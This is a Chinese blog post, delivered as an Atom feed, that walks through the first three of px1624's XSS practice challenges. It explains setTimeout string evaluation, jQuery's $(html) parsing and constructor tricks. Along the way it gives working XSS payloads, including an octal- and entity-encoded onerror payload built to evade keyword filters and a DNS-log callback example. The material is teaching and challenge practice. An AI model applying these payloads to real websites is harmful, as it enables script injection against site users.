<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>啦啦菌NODE</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lalajun.com/"/>
  <updated>2020-11-23T06:14:21.274Z</updated>
  <id>http://lalajun.com/</id>
  
  <author>
    <name>LaLa</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>十二个XSS案例重新认识XSS-上</title>
    <link href="http://lalajun.com/2020/11/18/%E5%8D%81%E4%BA%8C%E4%B8%AAXSS%E6%A1%88%E4%BE%8B%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86XSS-%E4%B8%8A/"/>
    <id>http://lalajun.com/2020/11/18/十二个XSS案例重新认识XSS-上/</id>
    <published>2020-11-18T09:05:33.000Z</published>
    <updated>2020-11-23T06:14:21.274Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。(现在已经变成了12题)</p><p>觉得是一个JS基础不是很好的菜鸡补充了解一些JS基础和奇怪姿势的很好的案例，此文包含1-6题（共9k7字），知识点大概包括：</p><ul><li>JS中 a[b] 等同于 a.b </li><li>JQuery的<code>$(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code>可以弹框</li><li>利用constructor的原理，衍生了题外话弹框替换：<code>&quot;&quot;[&quot;constructor&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</code></li><li>模板字符串具有类似跨行注释的特性</li><li>在字符串中使用运算符拼接执行js语句</li><li>正则匹配的规则、<code>.</code>的绕过</li></ul><p>对于以上列出知识点如果只有个别不清楚的，可以直接在各题知识点中找到它，然后看那一题就行了。</p><blockquote><p>此外还提出了第三题在官方WP中由于篇幅没有提到的使用注释的解法。在第七题也可以使用类似的思路</p></blockquote><p>实际上px1624有出官方WP，写的很好。但是以菜鸡的角度去看题目总会讲述到一些默认被跳过的但是又有点东西的细节，也做了一点衍生。写文章一向往细了写，结合了看可能也会有所帮助吧？</p><p>有错误喷就完事了。</p><blockquote><p>感谢px1624老哥的案例分享</p><p>感谢huuu老哥忍受了我一个憨批问题的骚扰和知识点指点</p></blockquote><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x=location.hash;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x</span>)</span>&#123;&#125;;</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="string">"aa('"</span>+x+<span class="string">"')"</span>,<span class="number">100</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 1~</span><br></pre></td></tr></table></figure><p><strong>知识点</strong>：</p><ul><li>location.hash</li><li>setTimeout</li></ul><ol><li><strong>location.hash</strong></li></ol><p>为URL中的锚点部分（<code>#</code>开始的部分，包括#），通常用户页面的浏览位置的定位</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL: <span class="string">"http://px1624.sinaapp.com/test/xsstest1/#');alert('1"</span></span><br><span class="line">location.hash: <span class="string">"#');alert('1"</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>setTimeout</strong></li></ol><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setTimeout" target="_blank" rel="noopener">setTimeout函数</a>分为2种使用方式</p><ul><li><code>setTimeout(JS函数名, 等待的毫秒数，参数1，参数2)</code>：延时后执行指定JS函数</li><li><code>setTimeout(JS代码(字符串格式), 等待的毫秒数)</code>：延时后执行指定字符串中的JS代码，与EVAL类似</li></ul><p>延迟执行JS代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//执行JS函数aa</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x</span>)</span>&#123;alert(x)&#125;;</span><br><span class="line">setTimeout(aa,<span class="number">100</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//执行js代码：弹框1</span></span><br><span class="line">setTimeout(<span class="string">"alert('1')"</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//执行js代码段：弹框1弹框2</span></span><br><span class="line">setTimeout(<span class="string">"alert('1');alert('2')"</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//js代码段可以调用当前上下文函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x</span>)</span>&#123;&#125;;</span><br><span class="line">setTimeout(<span class="string">"aa('#');alert('1')"</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//因为是字符串，也可以拼接后执行</span></span><br><span class="line">setTimeout(<span class="string">"aa('"</span>+<span class="string">"#');alert('1"</span>+<span class="string">"')"</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>那么现在再回头去看题目代码，就可以很显而易见的发现就是<strong>把location.hash的值拼接进入setTimeout的第一个参数中</strong>（即JS代码段），而由于setTimeout的特性，第一个参数的字符串会被当作JS解析执行。</p><p>那么我们只需要闭合前面的，然后执行我们指定的JS代码来进行弹框。</p><p>Writeup：</p><p><code>http://px1624.sinaapp.com/test/xsstest1/#&#39;);alert(&#39;1</code></p><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest2/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest2/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://code.jquery.com/jquery-3.4.1.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">Give me xss bypass <span class="number">2</span>~</span><br><span class="line">&lt;div style=<span class="string">'display:none'</span> id=<span class="string">'xx'</span>&gt;&amp;lt;img src=x onerror=alert(<span class="number">1</span>)&amp;gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">'button'</span> value=<span class="string">'test'</span> onclick=<span class="string">'alert("鍝堝搱锛岀偣杩欑帺鎰忔病鍟ョ敤鐨勶紒")'</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span><br><span class="line">   <span class="keyword">if</span>(vars)&#123;</span><br><span class="line">aa(vars[<span class="number">0</span>],vars[<span class="number">1</span>])</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#xx"</span>)[x]($(<span class="string">"#xx"</span>)[y]());</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p><strong>知识点</strong>：</p><ul><li>window.location.search</li><li>字符串操作：substring、split</li><li>JQuery的DOM对象操作</li><li>a[b] 等同于 a.b </li><li>JQuery元素的text属性会解析html编码</li></ul><ol><li><strong>window.location.search</strong>与<strong>字符串操作</strong></li></ol><p>为URL中的参数部分（？开始的部分，包括？），GET参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">URL: <span class="string">"http://px1624.sinaapp.com/test/xsstest1/?a1&amp;b1"</span></span><br><span class="line"><span class="built_in">window</span>.location.search: <span class="string">"?a1&amp;b1"</span></span><br><span class="line"><span class="comment">//substring(1)从第一位开始截取到最后一位</span></span><br><span class="line"><span class="built_in">window</span>.location.search.substring(<span class="number">1</span>): <span class="string">"a1&amp;b1"</span> </span><br><span class="line"><span class="comment">//query.split("&amp;")根据&amp;分割成数组</span></span><br><span class="line">query.split(<span class="string">"&amp;"</span>): [<span class="string">"a1"</span>,<span class="string">"b1"</span>]</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>JQuery的DOM对象操作</strong>  与 <strong>a[b] 等同于 a.b</strong></li></ol><p><code>$(&#39;#xx&#39;)</code> 等同于<code>document.getElementById(&#39;xx&#39;);</code>，就是JQuery语法里面的DOM元素选择器，这里选中了id=xx 的div标签。</p><p><strong>利用a[b] 等同于 a.b的JS特性</strong>，来进行转换，a1,b1为之前我们&amp;分割的两个字符串：</p><p><code>$(&quot;#xx&quot;)[a1]($(&quot;#xx&quot;)[b1]());</code>-&gt;<code>$(&quot;#xx&quot;).a1($(&quot;#xx&quot;).b1());</code></p><blockquote><p>但是a[b]不完全等价于a.b，前者b可以是一个动态的输入的字符串，但是后者就不可以，比如：</p><p>lala=”append”</p><p><code>a[lala](123)</code> 调用成功</p><p>a.lala(123) 调用失败</p></blockquote><p>这边显而易见，我们可控输入<strong>a1</strong>、<strong>b1</strong>最后控制id为xx的DOM节点的<strong>方法</strong> 和 <strong>值</strong>。</p><ol start="3"><li><strong>JQuery的DOM对象操作、JQuery元素的的text属性会解析html编码</strong></li></ol><p>在这里触发XSS自然是要<strong>修改DOM树，写入payload语句进行渲染</strong>，所以a1是一个可以修改DOM树的动作操作：</p><p>这里我们可以直接去查看<a href="https://jquery.cuishifeng.cn/" target="_blank" rel="noopener">JQuery官方文档</a>找到其中关于文档处理的部分，列出部分函数：</p><p>html、append、after、before等等，我们先选取<a href="https://jquery.cuishifeng.cn/html.html" target="_blank" rel="noopener">html</a>来修改DOM树。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#xx"</span>).html(<span class="number">123</span>)</span><br><span class="line"><span class="comment">//修改id=xx的标签的内容为123</span></span><br></pre></td></tr></table></figure><blockquote><p>此处在官方WP中还提出此处可以使用<strong>constructor</strong>，并且一笔带过。</p><p>事实是，此处确实可以使用constructor来进行弹框，但是其理论基础却不是通过修改DOM树，写入payload语句使页面进行重新渲染导致的。而是直接临时渲染单个节点，具体之后再进行解释。</p></blockquote><p><code>$(&quot;#xx&quot;).html($(&quot;#xx&quot;).b1());</code>，还有一处b1。我们现在需要html括号里面的<code>$(&quot;#xx&quot;).b1()</code>返回的内容为一个payload，而xx标签的内容本身就是一个payload，只不过是一个html编码后的payload。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gkvsxtoz2cj312u07g0t6.jpg" alt="2-1.png"></p><p>直接<code>$(&quot;#xx&quot;).html($(&quot;#xx&quot;).html())</code>这样获取到编码后的payload可以么？当然不可以，你会发现这只不过是把原来的东西取出来再放回去，怎么可能有用。</p><p>我们可以<strong>利用<a href="https://jquery.cuishifeng.cn/text.html" target="_blank" rel="noopener">text属性</a>会解析html编码的特性</strong>得到我们想要的未编码的payload，测试<code>$(&quot;#xx&quot;).b1()</code>b1的取值html与text：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#xx"</span>).html()</span><br><span class="line"><span class="string">"&amp;lt;img src=x onerror=alert(1)&amp;gt;"</span></span><br><span class="line">$(<span class="string">"#xx"</span>).text()</span><br><span class="line"><span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span></span><br></pre></td></tr></table></figure><p><strong>text属性返回被解析后的HTML标签</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#xx"</span>).html(<span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span>)</span><br><span class="line"><span class="comment">//直接弹框，最后再替换回去就行了</span></span><br><span class="line">$(<span class="string">"#xx"</span>).html($(<span class="string">"#xx"</span>).text())</span><br></pre></td></tr></table></figure><p>回退回去得到writeup1：</p><p><code>http://px1624.sinaapp.com/test/xsstest2/?html&amp;text</code></p><h3 id="constructor的触发原理"><a href="#constructor的触发原理" class="headerlink" title="constructor的触发原理"></a>constructor的触发原理</h3><p>之前说到payload使用constructor也是可以的，writeup2：</p><p><code>http://px1624.sinaapp.com/test/xsstest2/?constructor&amp;text</code></p><p>我们来看下具体技术细节，跳过字符串传递的那一部分，直接来到<code>$(&quot;#xx&quot;).constructor($(&quot;#xx&quot;).text())</code></p><p>在跳过text解析html编码的那一部分来到<code>$(&quot;#xx&quot;).constructor(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code></p><p>constructor其实就是取<code>$(&quot;#xx“)</code>这个JQuery对象的构造器，然后往构造器里面传参<code>&lt;img src=x onerror=alert(1)</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#xx"</span>).constructor === $().constructor</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><p>然而一个指定选择器的JQuery对象的构造器跟一个空的JQuery对象的构造器是完全等价的</p><p>创建一个JQuery对象其实就是给一个JQuery对象的构造器传参，所以：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#xx"</span>).constructor(<span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span>)</span><br><span class="line"><span class="comment">//实际上就是等于</span></span><br><span class="line">$(<span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span>)</span><br></pre></td></tr></table></figure><p><a href="https://api.jquery.com/jQuery/#jQuery2" target="_blank" rel="noopener">$(html)</a>，参考官方API或者看源码可以知道他会在一个临时的div中插入我们写入的html标签，但是这个标签不会直接插入到DOM树中，所以不会引起DOM树的变化因此也不会重新渲染页面。</p><p>虽然没有从源码中或者文档中找到它的渲染原理，但是经过测试，并不是所有标签或者JS都会被执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span>)</span><br><span class="line"><span class="comment">//执行弹框</span></span><br><span class="line">$(<span class="string">"&lt;audio src=dns地址 onerror=alert`1`&gt;"</span>)</span><br><span class="line"><span class="comment">//dnslog收到请求，执行弹框</span></span><br><span class="line">$(<span class="string">"&lt;video src=x onerror=\"javascript:alert(12)\"&gt;&lt;/video&gt;"</span>)</span><br><span class="line"><span class="comment">//执行弹框</span></span><br><span class="line">$(<span class="string">"&lt;svg onload=alert`1`&gt;"</span>)</span><br><span class="line"><span class="comment">//不执行弹框</span></span><br><span class="line">$(<span class="string">"&lt;script&gt;alert(2)&lt;/script&gt;"</span>)</span><br><span class="line"><span class="comment">//不执行弹框</span></span><br></pre></td></tr></table></figure><blockquote><p><code>$(console.log(1))</code>、<code>$(alert(1))</code>等表达式传参进入都是可以正常执行的。但是执行不是因为DOM操作的执行</p><p>因为会先执行alert(1)语句，然后再进入$()进行逻辑处理，我们传入的值不符合其预期，但是没有语法错误也是可以正常执行的。</p><p>但是$(“console.log(1)”)、$(“alert(1)”) 跟标签一样作为字符串传入，就不会弹框啦</p></blockquote><p>大致上只有单个标签<code>src=x 加上onerror</code>事件，会执行里面的JS代码，其他均不渲染执行。（如果有老哥知道原理的 可以跟我交流下，非常感谢）</p><blockquote><p>这种这种执行规则被px1642老哥在WP种写作JQuery的DOM XSS，但是个人理解的这不算在漏洞范畴，而是特性范畴。</p><p>最大的问题就是引入最新的3.5.1版本JQuery，在命令行中输入<code>$(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code>仍然会弹框。看以往JQuery 漏洞 都是过滤器过滤location.hash这类外部数据输入点（会存在#，编码等情况），从而完成修复的。$()直接引入字符串变量的，应该不算是漏洞？？？</p></blockquote><p>至此就对两类触发原理进行了区分，前者html等是直接修改页面的DOM树导致重新渲染执行，后者constructor是建立JQuery对象时进行有条件的渲染执行。</p><h3 id="题外话：利用constructor构造弹框"><a href="#题外话：利用constructor构造弹框" class="headerlink" title="题外话：利用constructor构造弹框"></a>题外话：利用constructor构造弹框</h3><p>上面提到constructor是获取前一对象的构造函数，我们可以利用这一特性来构造一个弹框函数：</p><p>其根本原理是使用Function来构造匿名函数，然后在其中写入任意的js代码进行执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sayHi = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'alert("Hello")'</span>);</span><br><span class="line">sayHi(); </span><br><span class="line"><span class="comment">//弹框Hello</span></span><br></pre></td></tr></table></figure><p>写成一句直接调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'alert("Hello")'</span>)();</span><br><span class="line"><span class="comment">//弹框</span></span><br><span class="line"><span class="comment">//精简去掉 new 和 ;</span></span><br><span class="line"><span class="built_in">Function</span>(<span class="string">'alert("Hello")'</span>)()</span><br><span class="line"><span class="comment">//弹框</span></span><br></pre></td></tr></table></figure><p>我们要知道Function是所有对象的最原始的构造函数，因为所有基础对象的上一层构造方法就是Function。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"1"</span>.substr</span><br><span class="line">ƒ substr() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">//substr方法</span></span><br><span class="line"><span class="keyword">typeof</span>(<span class="string">"1"</span>.substr)</span><br><span class="line"><span class="string">"function"</span></span><br><span class="line"><span class="keyword">typeof</span>(<span class="built_in">Object</span>)</span><br><span class="line"><span class="string">"function"</span></span><br><span class="line"><span class="keyword">typeof</span>(<span class="built_in">String</span>)</span><br><span class="line"><span class="string">"function"</span></span><br><span class="line"><span class="comment">//function的构造方法就是Function</span></span><br><span class="line"><span class="built_in">String</span>.constructor === <span class="built_in">Function</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="built_in">Object</span>.constructor === <span class="built_in">Function</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="comment">//来加上原来构造好的语句</span></span><br><span class="line"><span class="built_in">String</span>.constructor(<span class="string">'alert("Hello")'</span>)()</span><br><span class="line"><span class="comment">//弹框</span></span><br><span class="line"><span class="built_in">Object</span>.constructor(<span class="string">'alert("Hello")'</span>)()</span><br><span class="line"><span class="comment">//弹框</span></span><br></pre></td></tr></table></figure><p>我们还可以进一步构造出function</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"1"</span>.constructor === <span class="built_in">String</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="string">"1"</span>.constructor.constructor(<span class="string">"alert(1)"</span>)()</span><br><span class="line"><span class="keyword">typeof</span>(<span class="string">"1"</span>.substr)</span><br><span class="line"><span class="string">"function"</span></span><br><span class="line"><span class="string">"1"</span>.substr.constructor(<span class="string">"alert(1)"</span>)()</span><br></pre></td></tr></table></figure><p>再根据<code>a.b与a[b]等价</code>的定理,再删个1：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>[<span class="string">"substr"</span>][<span class="string">"constructor"</span>](<span class="string">"alert(1)"</span>)()</span><br><span class="line"><span class="string">""</span>[<span class="string">"constructor"</span>][<span class="string">"constructor"</span>](<span class="string">"alert(1)"</span>)()</span><br></pre></td></tr></table></figure><p>我们一路变形有啥意义么，通常而言，要替换弹框就是为了绕过关键词的检测，但是现在<code>alert(1)</code>关键词还在完全就是花里胡哨。</p><p>实际上现在”alert(1)”已经变为字符串了，针对<strong>字符串</strong>，可以使用<strong>16进制，8进制</strong>转码，我们用8禁止转码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>[<span class="string">"\163\165\142\163\164\162"</span>][<span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span>](<span class="string">"\141\154\145\162\164\50\61\51"</span>)()</span><br></pre></td></tr></table></figure><p>再放入IMG标签中，针对<strong>JS代码</strong>可以使用<strong>unicode编码</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"&amp;#34;&amp;#49;&amp;#34;&amp;#91;&amp;#34;&amp;#92;&amp;#49;&amp;#54;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#53;&amp;#92;&amp;#49;&amp;#52;&amp;#50;&amp;#92;&amp;#49;&amp;#54;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#34;&amp;#93;&amp;#91;&amp;#34;&amp;#92;&amp;#49;&amp;#52;&amp;#51;&amp;#92;&amp;#49;&amp;#53;&amp;#55;&amp;#92;&amp;#49;&amp;#53;&amp;#54;&amp;#92;&amp;#49;&amp;#54;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#92;&amp;#49;&amp;#54;&amp;#53;&amp;#92;&amp;#49;&amp;#52;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#49;&amp;#53;&amp;#55;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#34;&amp;#93;&amp;#40;&amp;#34;&amp;#92;&amp;#49;&amp;#52;&amp;#49;&amp;#92;&amp;#49;&amp;#53;&amp;#52;&amp;#92;&amp;#49;&amp;#52;&amp;#53;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#53;&amp;#48;&amp;#92;&amp;#54;&amp;#49;&amp;#92;&amp;#53;&amp;#49;&amp;#34;&amp;#41;&amp;#40;&amp;#41;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完事</p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>多点同步输出的注释使用</li><li>在字符串中使用运算符执行js</li></ul><p>从js的角度没有直接看到DOM类型的函数输入入口，可以判断跟前两题DOM XSS不一样，应该是个反射XSS。</p><p>那么参数就靠自己猜了，估摸不是px就是xss。</p><p><code>http://px1624.sinaapp.com/test/xsstest3/?px=123</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">'123'</span>;<span class="comment">//反射点1</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">'123'</span>);<span class="comment">//反射点2</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>px参数对应两处反射输出点，看看是否有编码过滤，使用payload：<code>&quot;/&lt;&gt;()&#39;%26;%20=*</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">'&amp;quot;/&amp;lt;&amp;gt;()'</span>&amp;amp;; =*<span class="string">';</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">'&amp;quot;/&amp;lt;&amp;gt;()'</span>&amp;amp;; =*<span class="string">');</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>被转义：<code>&quot;&lt;&gt;&amp;</code></li><li>可以使用：<code>/();空格=*</code></li></ul><p>可以发现单引号已经完成了js语句的闭合，在浏览器中也会发现语义会报错，可以确定可以进行注入。</p><blockquote><p>后端实际使用的是<a href="https://www.php.net/htmlspecialchars" target="_blank" 